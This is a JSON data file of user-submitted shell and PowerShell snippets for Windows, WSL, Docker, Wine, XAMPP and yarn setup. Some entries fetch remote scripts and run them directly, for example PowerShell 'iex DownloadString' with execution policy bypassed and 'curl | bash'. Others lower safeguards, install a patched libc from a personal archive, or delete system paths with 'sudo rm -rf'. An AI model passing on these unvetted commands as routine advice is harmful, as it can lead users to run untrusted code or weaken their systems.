    "description": "win + r and type \"cmd\" to open win terminal then: scrnsave.scr /s\n",
    "reg_date": "2021-10-11T22:13:30.000Z"
  },
  {
    "id": 5035,
    "keyword": null,
    "link": null,
    "title": " windows delete all docker images",
    "description": "$ docker system prune --all \n$images = docker images -a -q foreach ($image in $images) { docker image rm $image -f } \n",
    "reg_date": "2021-10-11T22:13:30.000Z"
  },
  {
    "id": 5036,
    "keyword": null,
    "link": null,
    "title": " windows etc hosts",
    "description": "Hosts file location: C:\\Windows\\System32\\Drivers\\Etc\\hosts\nc:\\Windows\\System32\\Drivers\\etc\\hosts windows 10 drivers etc hosts \nC:\\Windows\\System32\\Drivers\\etc\\hosts\n",
    "reg_date": "2021-10-11T22:13:30.000Z"
  },
  {
    "id": 5037,
    "keyword": null,
    "link": null,
    "title": " windows flush dns",
    "description": "ipconfig /flushdns\nDont flush your dns too much, or your wifi might get worse\n/etc/init.d/nscd restart\nsudo lookupd -flushcache\nsudo killall -HUP mDNSResponder\nsudo dscacheutil -flushcache\n",
    "reg_date": "2021-10-11T22:13:31.000Z"
  },
  {
    "id": 5038,
    "keyword": null,
    "link": null,
    "title": " windows install chocolatey",
    "description": "# Run Powrshell as admin  Copy Paste this  Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\n@\"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \" [System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\" && SET \"PATH=%PATH%;%ALLUSERSPROFILE%\\chocolatey\\bin\"\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\n# COPY AND PASTE THIS COMMAND   # using cmd as admin @\"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \"iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\" && SET \"PATH=%PATH%;%ALLUSERSPROFILE%\\chocolatey\\bin\"  #or  #using powershell as admin Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\n@\"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \"[System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\" && SET \"PATH=%PATH%;%ALLUSERSPROFILE%\\chocolatey\\bin\"\n",
    "reg_date": "2021-10-11T22:13:31.000Z"
  },
  {
    "id": 5039,
    "keyword": null,
    "link": null,
    "title": " windows kill port",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \nnetstat -ano | findstr :3001 taskkill /PID <yourid> /F\nkill -9 $(sudo lsof -t -i:8080) \nnetstat -ano | findstr \"PORT_NUMBER\"  taskkill /PID PORT_NUMBER /f\nnetstat -ano | findstr :8080 taskkill /PID <yourid> /F\nnetstat -ano | findstr \"PORT_NUMBER\"  taskkill /PID <ID_HERE> /f  //can be found on the last column next to LISTENING ____________________________________________________________________________  TCP    0.0.0.0:3000           0.0.0.0:0              LISTENING       24660 ____________________________________________________________________________  !! taskkill /PID 24660 /f \n",
    "reg_date": "2021-10-11T22:13:31.000Z"
  },
  {
    "id": 5040,
    "keyword": null,
    "link": null,
    "title": " windows npm install permission denied",
    "description": "npm config set unsafe-perm true  \n",
    "reg_date": "2021-10-11T22:13:31.000Z"
  },
  {
    "id": 5041,
    "keyword": null,
    "link": null,
    "title": " windows powershell ise run as administrator",
    "description": "You can right-click on \"Start\" --> \"Windows PowerShell Module\" or \"Windows PowerShell ISE\" by going to \"Start\" --> \"Administrative Tools\" --> \"Windows PowerShell Module\" or \"Windows PowerShell ISE\". Select \"Run As administrator\". Anything you run in that window will be as \"Administrator\"\n",
    "reg_date": "2021-10-11T22:13:31.000Z"
  },
  {
    "id": 5042,
    "keyword": null,
    "link": null,
    "title": " windows powershell symlink",
    "description": "# In elevated powershell New-Item -ItemType SymbolicLink -Path \"Link\" -Target \"Target\"\n",
    "reg_date": "2021-10-11T22:13:31.000Z"
  },
  {
    "id": 5043,
    "keyword": null,
    "link": null,
    "title": " windows shortcuts",
    "description": "[Windows key] # Open the start menu  [Windows-Taste] + [E] # Start Explorer  [Windows key] + [R] # Run dialog  [Windows key] + [pause] # System properties (= Control Panel \\ System and Security \\ System)  [Windows key] + [L] # Locks the computer   ## Arrange & select windows  [Windows key] + [D] # show desktop  [Windows key] + [M] # Minimize all windows (+ [Shift] = undo)  [Windows key] + [Left arrow] / [Right arrow] # Reduce / dock window  [Windows key] + [Up arrow] / [Down arrow] # Maximize / reduce window  [Windows key] + [1] .. [9] # Activates windows number 1 .. 9 of the task bar (+ [Shift] = new instance)  [Windows key] + [T] # Switches between the instances of the taskbar (+ [Shift] = to the left)  [Windows key] + [B] # Activates the taskbar  Left mouse button + [Shift] # Starts new instances of programs in the taskbar  Left mouse button + [Shift] + [Ctrl] # ... in administrator mode   ## Screen magnifier  [Windows key] + [+] # Activates the magnifying glass  [Windows key] + [Esc] # Deactivates the magnifying glass   ## Go to the menu bar  [Old] # Activate the application menu bar  [Alt] + underlined letter # Opens the corresponding menu item from the list   ## Select running programs  [Alt] + [Tab] # Show and switch running tasks (+ [Shift] to the left)  [Alt] + [Esc] # switch between running tasks (+ [Shift] to the left)   ## Copy & Paste (C&P)  [Ctrl] + [C] # Copy  [Ctrl] + [X] # cut out  [Ctrl] + [V] # Insert  [Ctrl] + [A] # Select all   ## Office (Word, Excel, Powerpoint, ...) & Internet Browser  [Ctrl] + [Home] # Go to the beginning of a document  [Ctrl] + [End] # Go to the end of a document  ... + [Shift] # Mark to the beginning / end  [Ctrl] + [Z] # Undo last action  [Ctrl] + [Y] # Repeat last action  [Ctrl] + [S] # to save  [F12] # Save as  [Ctrl] + [N] # Open a new window (WORD, EXCEL, ..., Internet Explorer)  [Ctrl] + [T] # Open new tab (browser)  [Ctrl] + [O] # Open file  [Ctrl] + [P] # Print file  [Ctrl] + [W] # Close window or tab  [Ctrl] + [F] # Search dialog (Office, Internet Explorer, ...)  [Ctrl] + [Alt] + [V] # Paste content (= paste options)  [Ctrl] + [mouse scroll wheel] # Zoom within an application (zoom in / out)   ## Position cursor (mouse pointer) / mark text with keyboard  [Ctrl] + [Left arrow] / [Right arrow] # Position cursor at the beginning of the previous / next word  [Ctrl] + [Up arrow] / [Down arrow] # Position cursor at the beginning of the previous / next paragraph  [Ctrl] + [Shift] + arrows # simultaneous marking (selection)  [Ctrl] + ([Shift]) + [Up arrow] / [Down arrow] # EXCEL: Position cursor on first / last filled cell. With [End] instead of the arrows this happens across columns.   ## Exit programs / tabs  [Ctrl] + [Tab] # Switch between tabs / tabs (+ [Shift] to the left)  [Ctrl] + [F4] # Close the current tab (or subroutine)  [Alt] + [F4] # Exit application (program) or Windows   ## Microsoft Windows system keyboard shortcuts  [Shift] + [F10] # Open context menu (same as right mouse button)  [Esc] # cancel the current process  [Space key] # simple mouse click  [F1] # Show Windows internal help (with online option)  [F5] # Refresh view (Explorer, Browser)  [F2] # Rename selected element (in Excel = edit cell)  [F8] # Boot into Safe Mode during the startup process  [F10] # Activate / deactivate menu bar  [F11] # Full screen mode (= presentation mode) on / off  [Ctrl] # Drag & Drop (D&D; drag and drop): Changes to copy (instead of moving)  [Ctrl] + [Shift] + [Esc] # Start the task manager directly  [Shift] + [Alt] # Language: Changes the keyboard layout (e.g. switching from English to German)   ## Screenshots  [Alt] + [Print] # Screenshot of the active window  [Pressure] # Screenshot of the entire screen   Windows Explorer & Desktop  [Alt] + [Return] # Properties of the selected element  [Left arrow] / [Right arrow] # In the Explorer navigation window (left): closes / opens folder structure  [Ctrl] + [Shift] + [N] # Creates a new folder  [Ctrl] + [N] # Open a new Explorer window (with the same path)  [Alt] + [Up arrow] # Switches to the parent folder  [Return] # Opens the selected folder  [Alt] + [Left arrow] / [Right arrow] # Navigate back / forward  [Shift] + [right mouse button] on file # Adds \"Copy as Path\" to the context menu  [Shift] + [right mouse button] on folder # Adds \"Open command prompt here\" to the context menu  [Alt] + [A] + [&szlig;] / [I] / [D] # Switches to large icons / content view / detail view in Explorer  [Alt] + [A] + [O] # In the Explorer \"Sort by ...\"  [Alt] + [A] + [M] # In Explorer \"Open with ...\"  [Shift] + [Del] # Delete permanently (without the recycle bin)\nWindows Key:  [Win] \t\t\t\t- Open the start menu [Win] + E \t\t\t- Open Windows File Explorer [Win] + L\t\t\t- Lock the computer [Win] + M\t\t\t- Minimize all windows [Win] + [Shift] + M - Restore all minimized windows\n",
    "reg_date": "2021-10-11T22:13:32.000Z"
  },
  {
    "id": 5044,
    "keyword": null,
    "link": null,
    "title": " windows shutdown command timer",
    "description": "shutdown -s -t SECONDS\n",
    "reg_date": "2021-10-11T22:13:32.000Z"
  },
  {
    "id": 5045,
    "keyword": null,
    "link": null,
    "title": " windows stop process running on port 8080",
    "description": "netstat  -ano  |  findstr  <Port Number> taskkill  /F  /PID  <Process Id>\ntaskkill /F /PID PORT_NUMBER\n",
    "reg_date": "2021-10-11T22:13:32.000Z"
  },
  {
    "id": 5046,
    "keyword": null,
    "link": null,
    "title": " windows tail command powershell",
    "description": "cat FILENAME  -tail 200 // To show last 200 lines of a file //Another Commmand Get-Content FILENAME -tail 10 // To show last 10 lines of a file\n",
    "reg_date": "2021-10-11T22:13:32.000Z"
  },
  {
    "id": 5047,
    "keyword": null,
    "link": null,
    "title": " windows wsl2 linux install docker",
    "description": "//INSTALL DOCKER ON LINUX SUBSYSTEM (ON WIN 10) AND ALL REQUIRED SOFTWARE //---------------------------------------------------------------------------------------------------- #ENABLE LINUX SUBSYTEM IN CONTROL PANEL #INSTALL WSL2 #INSTALL PREFFERED LINUX DISTRO  #INSTALLING DOCKER ON SUBSYSTEM #https://dzone.com/articles/wsl2-for-dockerized-net-core-application-subhankar  #Setup WSL2 (Enable Hyper-V) #Fire up your PowerShell(Administrative mode) and run the below commands.   #This will enable the virtualization feature which will be used by WSL2  Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux  #Next you have to find out your Installed Linux Distribution, so that you can set that distribution to work as WSL version 2. wsl -l -v  #convert your current Linux Distribution to WSL version 2 wsl --set-version Ubuntu 2  #Finally, if you want to use your WSL2 as the default version then execute the command below. wsl --set-default-version 2  # Update the apt package list. sudo apt-get update -y  # Install Docker's package dependencies. sudo apt-get install -y \\     apt-transport-https \\     ca-certificates \\     curl \\     software-properties-common  # Download and add Docker's official public PGP key. curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -  # Verify the fingerprint. sudo apt-key fingerprint 0EBFCD88  # Add the `stable` channel's Docker upstream repository. # # If you want to live on the edge, you can change \"stable\" below to \"test\" or # \"nightly\". I highly recommend sticking with stable! sudo add-apt-repository \\    \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\    $(lsb_release -cs) \\    stable\"  # Update the apt package list (for the new apt repo). sudo apt-get update -y  # Install the latest version of Docker CE. sudo apt-get install -y docker-ce  # Allow your user to access the Docker CLI without needing root access. sudo usermod -aG docker $USER  #START DOCKER DAEMON sudo service docker start sudo service docker status  #VERIFY sudo docker info (or docker ps)\n",
    "reg_date": "2021-10-11T22:13:32.000Z"
  },
  {
    "id": 5048,
    "keyword": null,
    "link": null,
    "title": " wine install ubuntu",
    "description": "#Install trough Ubuntu libraries sudo apt install wine64\n# Add wine key wget -nc https://dl.winehq.org/wine-builds/winehq.key sudo apt-key add winehq.key  # Add repository  sudo add-apt-repository 'deb https://dl.winehq.org/wine-builds/ubuntu/ focal main'  # Update packages  sudo apt update  # Install wine  sudo apt install --install-recommends winehq-stable \nsudo apt update sudo apt install wine64\nsudo apt-get install libgnutls30:i386 libldap-2.4-2:i386 libgpg-error0:i386 libxml2:i386 libasound2-plugins:i386 libsdl2-2.0-0:i386 libfreetype6:i386 libdbus-1-3:i386 libsqlite3-0:i386\n$ sudo dpkg --add-architecture i386\n$ wget -qO- https://dl.winehq.org/wine-builds/Release.key | sudo apt-key add -\n",
    "reg_date": "2021-10-11T22:13:32.000Z"
  },
  {
    "id": 5049,
    "keyword": null,
    "link": null,
    "title": " winehq-stable : Depends: wine-stable (= 5.0.1~bionic)",
    "description": "sudo apt update && sudo apt install --install-recommends winehq-stable\n",
    "reg_date": "2021-10-11T22:13:32.000Z"
  },
  {
    "id": 5050,
    "keyword": null,
    "link": null,
    "title": " wireless adb",
    "description": "# Wireless ADB $ adb tcpip 5555  $ adb shell netcfg #to get device IP $ adb connect <device_ip>  # DETAILS # 1. Connect your Android device and adb host computer to a common Wi-Fi network.  # 2. Connect the device to the host computer via USB.  # 3. Set the target device to listen for a TCP/IP connection on port 5555. $ adb tcpip 5555  # 4. Get the IP of the target device $ adb shell netcfg # Example Output: # wlan0\tUP\t10.0.0.8/24\t0x00001043\td4:12:43:d2:c4:18 # we want the \"10.0.0.8\"  # 5. Disconnect the USB cable from the target device.  # 6. Connect to the device by its IP address. $ adb connect 10.0.0.8  # 7. Confirm that your host computer is connected to the target device: $ adb devices # Example Output: # List of devices attached # 10.0.0.8:5555 device  # if there are multiple devices attached # specify which device to communicate with using the -s option $ adb -s 10.0.0.8 shell\nAndroid Debug Bridge\n",
    "reg_date": "2021-10-11T22:13:33.000Z"
  },
  {
    "id": 5051,
    "keyword": null,
    "link": null,
    "title": " woeusb ubuntu install",
    "description": "sudo add-apt-repository ppa:tomtomtom/woeusb sudo apt update  sudo apt install woeusb\n",
    "reg_date": "2021-10-11T22:13:33.000Z"
  },
  {
    "id": 5052,
    "keyword": null,
    "link": null,
    "title": " wondershaper",
    "description": "# Basic example wondershaper -a eth0 -d 1024 -u 512  # Clear wondershaper rules wondershaper -c -a eth0\n",
    "reg_date": "2021-10-11T22:13:33.000Z"
  },
  {
    "id": 5053,
    "keyword": null,
    "link": null,
    "title": " write a bash program to print a given number in reverse order",
    "description": "n=123465 sd=0 rev=0 while [ $n -gt 0 ] do     sd=$(( $n % 10 ))     rev=$(( $rev * 10 + $sd ))     n=$(( $n / 10 )) done echo \"Reverse number of entered digit is $rev\"\n",
    "reg_date": "2021-10-11T22:13:33.000Z"
  },
  {
    "id": 5054,
    "keyword": null,
    "link": null,
    "title": " write a shell script that counts how many directories exist at the current location",
    "description": "tree -L 1\n",
    "reg_date": "2021-10-11T22:13:33.000Z"
  },
  {
    "id": 5055,
    "keyword": null,
    "link": null,
    "title": " write command docker without need write sudo",
    "description": "$ sudo groupadd docker $ sudo usermod -aG docker $USER $ newgrp docker \n#for write command docker without need write sudo  #add all command in your terminal sudo groupadd docker sudo usermod -aG docker $USER newgrp docker \n",
    "reg_date": "2021-10-11T22:13:33.000Z"
  },
  {
    "id": 5056,
    "keyword": null,
    "link": null,
    "title": " wsl2 access folder from windows",
    "description": "Open File Explorer. Type \\\\wsl$ in the address bar. My distro shows up and click on it and you can see the file system\n",
    "reg_date": "2021-10-11T22:13:33.000Z"
  },
  {
    "id": 5057,
    "keyword": null,
    "link": null,
    "title": " wsl2 release memory",
    "description": "STEP 1 alias drop_cache=\"sudo sh -c \\\"echo 3 >'/proc/sys/vm/drop_caches' && swapoff -a && swapon -a && printf '\\n%s\\n' 'Ram-cache and Swap Cleared'\\\"\" STEP 2 source ~/.bashrc STEP 3 drop_cache\n[wsl2] # https://docs.microsoft.com/en-us/windows/wsl/wsl-config (Docs) # https://github.com/microsoft/WSL/issues/4166 (Topic) memory=4GB swap=16GB localhostForwarding=true\n",
    "reg_date": "2021-10-11T22:13:34.000Z"
  },
  {
    "id": 5058,
    "keyword": null,
    "link": null,
    "title": " wsl ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/run/mysqld/mysqld.sock' (2)",
    "description": "sudo chown -R _mysql:mysql /usr/local/var/mysql  sudo mysql.server start\n# Remove mysql sudo apt-get remove --purge mysql\\*  #update repositories sudo apt update  # Reinstall it sudo apt install mysql-server mysql-client  # Test if it runs sudo mysql  # You can install also thes pachages. Optionnaly sudo apt install php  #mesabo youbeyou\n# If you're usinng wsl sudo /etc/init.d/mysql start #else sudo apt-get remove --purge mysql* sudo apt-get autoremove sudo apt-get autoclean sudo apt-get install mysql-server mysql-client\nln -s /private/var/mysql/mysql.sock /tmp/mysql.sock \nsudo apt-get install mysql-server \nsudo /etc/init.d/mysql start\n",
    "reg_date": "2021-10-11T22:13:34.000Z"
  },
  {
    "id": 5059,
    "keyword": null,
    "link": null,
    "title": " wsl cannot read realtime clock",
    "description": "wget https://launchpad.net/~rafaeldtinoco/+archive/ubuntu/lp1871129/+files/libc6_2.31-0ubuntu8+lp1871129~1_amd64.deb  sudo dpkg --install libc6_2.31-0ubuntu8+lp1871129~1_amd64.deb  sudo apt-mark hold libc6  sudo apt --fix-broken install  sudo apt full-upgrade \n",
    "reg_date": "2021-10-11T22:13:34.000Z"
  },
  {
    "id": 5060,
    "keyword": null,
    "link": null,
    "title": " wsl convert to wsl2",
    "description": "wsl --set-version <Distro> 2  # For setting all future distributions to use WSL 2 wsl --set-default-version 2\n",
    "reg_date": "2021-10-11T22:13:34.000Z"
  },
  {
    "id": 5061,
    "keyword": null,
    "link": null,
    "title": " wsl default user",
    "description": "ubuntu2 config --default-user root  #ubuntu 20.04 ubuntu2004 config --default-user root  #ubuntu 18.04 ubuntu1804 config --default-user root\n",
    "reg_date": "2021-10-11T22:13:34.000Z"
  },
  {
    "id": 5062,
    "keyword": null,
    "link": null,
    "title": " wsl list distros",
    "description": "wsl -l -v\nwsl -s <DistributionName>, wsl --setdefault <DistributionName>\n",
    "reg_date": "2021-10-11T22:13:34.000Z"
  },
  {
    "id": 5063,
    "keyword": null,
    "link": null,
    "title": " wsl screen permission denied",
    "description": "# Tested on WSL Ubuntu sudo /etc/init.d/screen-cleanup start\ncp /mnt/c/path/to/the/file /path/to/the/folder/in/linux  \n",
    "reg_date": "2021-10-11T22:13:34.000Z"
  },
  {
    "id": 5064,
    "keyword": null,
    "link": null,
    "title": " wsl version",
    "description": "wsl -l -v\nwsl -l -v # If version 2 is installed properly, you will see the version number.  # If you don't see a version number, or if you see an error message  # you have version 1\nwsl --list --verbose wsl --set-version <distribution name> <versionNumber>\nEnable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux\nwsl.exe --set-version Ubuntu 2\ndism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart\n",
    "reg_date": "2021-10-11T22:13:35.000Z"
  },
  {
    "id": 5065,
    "keyword": null,
    "link": null,
    "title": " wtforms install",
    "description": "pip install WTForms\n",
    "reg_date": "2021-10-11T22:13:35.000Z"
  },
  {
    "id": 5066,
    "keyword": null,
    "link": null,
    "title": " xóa 1 thu vien trong laravel 8",
    "description": "composer remove vendor/package\n",
    "reg_date": "2021-10-11T22:13:35.000Z"
  },
  {
    "id": 5067,
    "keyword": null,
    "link": null,
    "title": " xammp lubuntu",
    "description": "wget \"https://sourceforge.net/projects/xampp/files/XAMPP Linux/7.4.7/xampp-linux-x64-7.4.7-0-installer.run/download\" -O xampp-installer.run\nchmod +x xampp-installer.run\nsudo ./xampp-installer.run\n",
    "reg_date": "2021-10-11T22:13:35.000Z"
  },
  {
    "id": 5068,
    "keyword": null,
    "link": null,
    "title": " xampp apache not starting",
    "description": "sudo /etc/init.d/apache2 stop    sudo /opt/lampp/lampp start\nsudo systemctl stop nginx  sudo /opt/lampp/lampp start\nFollow the steps to solve your problem: 1_ open xammp 2_ click config in apache line 3_ click Apache(httpd.conf) 4_ search for '80'(Default Port) and change it to any number. ex: 81,82....   change:   1_ #Listen 12.34.56.78:80 to 81   Listen 80 to 81   2_ ServerName localhost:80 to 81 5_ save and exit. ** if your problem does not solved follow these steps** 1_ open xammp 2_ click config in apache line 3_ click Apache(httpd-ssl.conf) 4_ search for 443 and change it for 4433   change:   1_ Listen 443 to 4433   2_ <VirtualHost _default_:443> to 4433 5_ save and exit.\n",
    "reg_date": "2021-10-11T22:13:35.000Z"
  },
  {
    "id": 5069,
    "keyword": null,
    "link": null,
    "title": " xampp the installer requires root privileges",
    "description": "sudo ./xampp-linux-x64-1.8.3-4-installer.run\n",
    "reg_date": "2021-10-11T22:13:35.000Z"
  },
  {
    "id": 5070,
    "keyword": null,
    "link": null,
    "title": " xclip string to clipboard",
    "description": "echo -n \"my string\" | xclip -selection clipboard\n",
    "reg_date": "2021-10-11T22:13:35.000Z"
  },
  {
    "id": 5071,
    "keyword": null,
    "link": null,
    "title": " xcode-selec not working",
    "description": "sudo rm -rf $(xcode-select -print-path) xcode-select --install\n",
    "reg_date": "2021-10-11T22:13:36.000Z"
  },
  {
    "id": 5072,
    "keyword": null,
    "link": null,
    "title": " xcode clean derived data command line",
    "description": "rm -fr ~/Library/Developer/Xcode/DerivedData/*\n",
    "reg_date": "2021-10-11T22:13:36.000Z"
  },
  {
    "id": 5073,
    "keyword": null,
    "link": null,
    "title": " xdebug ubuntu",
    "description": "sudo apt install php-xdebug\n",
    "reg_date": "2021-10-11T22:13:36.000Z"
  },
  {
    "id": 5074,
    "keyword": null,
    "link": null,
    "title": " xdg check defult browser",
    "description": "$ xdg-settings get default-web-browser\n",
    "reg_date": "2021-10-11T22:13:36.000Z"
  },
  {
    "id": 5075,
    "keyword": null,
    "link": null,
    "title": " xlrd python install",
    "description": "pip install xlrd\n",
    "reg_date": "2021-10-11T22:13:36.000Z"
  },
  {
    "id": 5076,
    "keyword": null,
    "link": null,
    "title": " xlsx Module ../../xlsx/types has no exported member IProperties. Did you mean Properties?",
    "description": "npm install --save @types/xlsx\n",
    "reg_date": "2021-10-11T22:13:36.000Z"
  },
  {
    "id": 5077,
    "keyword": null,
    "link": null,
    "title": " xrandr add 1366",
    "description": "xrandr --newmode \"1366\" 75.61  1366 1406 1438 1574  768 771 777 800  -HSync +Vsync # if DP-2 not found, you can choose vga display in xrandr xrandr --addmode DP-2 1366 xrandr --output DP-2 --mode 1366 --rate 59.79 # refresh rate 59,79 Hz\nxrandr --newmode \"1366\" 75.61  1366 1406 1438 1574  768 771 777 800  -HSync +Vsync && xrandr --addmode DP-2 1366 && xrandr --output DP-2 --mode 1366 --rate 59.79\nxrandr --newmode \"1366\" 75.61  1366 1406 1438 1574  768 771 777 800  -HSync +Vsync && xrandr --addmode DP-2 1366 && xrandr --output DP-2 --mode 1366\nxrandr --newmode \"1366x768-0abc\" 75.61  1366 1406 1438 1574  768 771 777 800 -hsync -vsync && xrandr --addmode DP-2 \"1366x768-0abc\" && xrandr --output DP-2 --mode \"1366x768-0abc\" #OR xrandr --newmode \"1366x768-0abc\" 75.61  1366 1406 1438 1574  768 771 777 800 -hsync -vsync xrandr --addmode DP-2 \"1366x768-0abc\" xrandr --output DP-2 --mode \"1366x768-0abc\"\n",
    "reg_date": "2021-10-11T22:13:38.000Z"
  },
  {
    "id": 5078,
    "keyword": null,
    "link": null,
    "title": " xrandr add 1920",
    "description": "xrandr --newmode \"1920x1080_60.00\"  172.80  1920 2040 2248 2576  1080 1081 1084 1118  -HSync +Vsync xrandr --addmode DP-2 1920x1080_60.00 xrandr --output DP-2 --mode 1920x1080_60.00\nxrandr --newmode \"1920x1080_60.00\"  172.80  1920 2040 2248 2576  1080 1081 1084 1118  -HSync +Vsync && xrandr --addmode DP-2 1920x1080_60.00 && xrandr --output DP-2 --mode 1920x1080_60.00\n",
    "reg_date": "2021-10-11T22:13:38.000Z"
  },
  {
    "id": 5079,
    "keyword": null,
    "link": null,
    "title": " yarn: command not found",
    "description": "npm install --global yarn\nbrew install yarn \nbrew install yarn\n",
    "reg_date": "2021-10-11T22:13:38.000Z"
  },
  {
    "id": 5080,
    "keyword": null,
    "link": null,
    "title": " yarn",
    "description": "npm install --global yarn \nchoco install yarn \n// amazing simple tool for NodeJs Developer  yarn add natural-utility -S\n",
    "reg_date": "2021-10-11T22:13:38.000Z"
  },
  {
    "id": 5081,
    "keyword": null,
    "link": null,
    "title": " yarn .gitignore",
    "description": "#If you're using Zero-Installs: .yarn/* !.yarn/cache !.yarn/patches !.yarn/plugins !.yarn/releases !.yarn/sdks !.yarn/versions  #If you're not using Zero-Installs: .yarn/* !.yarn/patches !.yarn/releases !.yarn/plugins !.yarn/sdks !.yarn/versions .pnp.*\n",
    "reg_date": "2021-10-11T22:13:38.000Z"
  },
  {
    "id": 5082,
    "keyword": null,
    "link": null,
    "title": " yarn 2 outdated packages",
    "description": "# Answer for Yarn 2 Upgrade All Packages  $ yarn plugin import interactive-tools $ yarn upgrade-interactive   Press <up>/<down> to select packages.      Press <enter> to install.  Press <left>/<right> to select versions.   Press <ctrl+c> to abort.    # And if U Want To Use The Old Command (yarn outdated) install this plugin $ yarn plugin import https://github.com/mskelton/yarn-plugin-outdated/raw/main/bundles/@yarnpkg/plugin-outdated.js $ yarn outdated \n",
    "reg_date": "2021-10-11T22:13:38.000Z"
  },
  {
    "id": 5083,
    "keyword": null,
    "link": null,
    "title": " yarn 2 upgrade all packages",
    "description": "# You've to install the interactive-tools plugin first. $ yarn plugin import interactive-tools $ yarn upgrade-interactive   Press <up>/<down> to select packages.      Press <enter> to install.  Press <left>/<right> to select versions.   Press <ctrl+c> to abort.    # And if U Want To Use The Old Command (yarn outdated) install this plugin $ yarn plugin import https://github.com/mskelton/yarn-plugin-outdated/raw/main/bundles/@yarnpkg/plugin-outdated.js $ yarn outdated \n",
    "reg_date": "2021-10-11T22:13:38.000Z"
  },
  {
    "id": 5084,
    "keyword": null,
    "link": null,
    "title": " yarn clear cache",
    "description": "yarn cache clean\nwatchman watch-del-all && rm -f yarn.lock && rm -rf node_modules && yarn && yarn start --reset-cache \n",
    "reg_date": "2021-10-11T22:13:39.000Z"
  },
  {
    "id": 5085,
    "keyword": null,
    "link": null,
    "title": " yarn command",
    "description": "npm install --global yarn \n",
    "reg_date": "2021-10-11T22:13:39.000Z"
  },
  {
    "id": 5086,
    "keyword": null,
    "link": null,
    "title": " yarn download ubuntu",
    "description": "curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list sudo apt update && sudo apt install yarn\ncurl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list \n",
    "reg_date": "2021-10-11T22:13:39.000Z"
  },
  {
    "id": 5087,
    "keyword": null,
    "link": null,
    "title": " yarn emojis",
    "description": "yarn config set -- --emoji true\n",
    "reg_date": "2021-10-11T22:13:39.000Z"
  },
  {
    "id": 5088,
    "keyword": null,
    "link": null,
    "title": " yarn install",
    "description": "npm install --global yarn \nnpm install --global yarn\ncurl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list sudo apt update && sudo apt install yarn\nbrew install yarn \nnpm install 'pckg-name'   -> yarn add 'pckg-name' npm uninstall 'pckg-name' -> yarn remove 'pckg-name' npm run 'your-script'     -> yarn run 'your-script' npm init \t\t\t\t  -> yarn init npm install \t\t\t  -> yarn OR yarn install  ## In yarn flags like: --save-dev --save are used the same way\ncurl -o- -L https://yarnpkg.com/install.sh | bash \n",
    "reg_date": "2021-10-11T22:13:39.000Z"
  },
  {
    "id": 5089,
    "keyword": null,
    "link": null,
    "title": " yarn install ubuntu",
    "description": "npm install --global yarn \ncurl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list sudo apt update && sudo apt install yarn\nsudo apt install --no-install-recommends yarn\ncurl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list\nbrew install yarn\ncurl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list \n",
    "reg_date": "2021-10-11T22:13:39.000Z"
  },
  {
    "id": 5090,
    "keyword": null,
    "link": null,
    "title": " yarn install windows",
    "description": "npm install --global yarn \nnpm install --global yarn\ncurl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add - echo \"deb https://dl.yarnpkg.com/debian/ stable main\" | sudo tee /etc/apt/sources.list.d/yarn.list sudo apt update && sudo apt install yarn\nbrew install yarn \nbrew install yarn\nnpm install --global yarn   and   https://classic.yarnpkg.com/latest.msi\n",
    "reg_date": "2021-10-11T22:13:39.000Z"
  },
  {
    "id": 5091,
    "keyword": null,
    "link": null,
    "title": " yarn run ios device",
